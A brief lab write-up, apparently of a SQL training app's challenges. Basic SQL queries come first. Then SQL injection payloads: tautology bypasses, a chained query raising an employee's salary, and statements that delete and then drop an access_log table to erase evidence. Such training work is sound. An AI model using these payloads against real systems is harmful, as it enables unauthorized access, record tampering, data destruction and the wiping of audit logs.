# Challenge name: What is SQL?
My query: `SELECT department FROM Employees WHERE last_name = 'Franco'`

# Challenge name: Data Manipulation Language (DML)
Myquery: `UPDATE Employees SET department = 'Sales' WHERE userid = 89762`

# Challenge name: Data Definition Language (DDL)
My query: `ALTER TABLE Employees ADD phone varchar(20)`

# Challenge name: Data Control Language (DCL)
My query: `GRANT SELECT on grant_rights to unauthorized_user`

# Challenge name: Try It! String SQL injection
My answer: `Smith'` `or` `'1'='1`

# Challenge name: Try It! Numeric SQL injection
My payload on `User_Id`: `1 or 1=1 --` and on `Login_Count` is anything number.

# Challenge name: Compromising confidentiality with String SQL injection
My payload on `Employee Name`: `' or 1=1 -- `

# Challenge name: Compromising Integrity with Query chaining
My payload on `Employee Name`: `';UPDATE Employees SET salary = 100000 WHERE userid = 37648 -- `

# Challenge name: Compromising Availability
First payload `'; DELETE FROM access_log -- ` 
But... `There is still evidence of what you did. Better remove the whole table.`
Last payload: `'; DROP TABLE access_log -- `